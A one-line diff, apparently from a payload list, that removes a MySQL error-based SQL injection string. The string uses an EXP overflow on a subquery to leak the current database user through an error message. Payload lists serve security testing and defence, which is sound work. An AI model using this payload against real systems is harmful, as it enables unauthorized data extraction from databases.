@@ -1,1 +1,0 @@
-' AND EXP(~(SELECT * FROM (SELECT USER())x))--
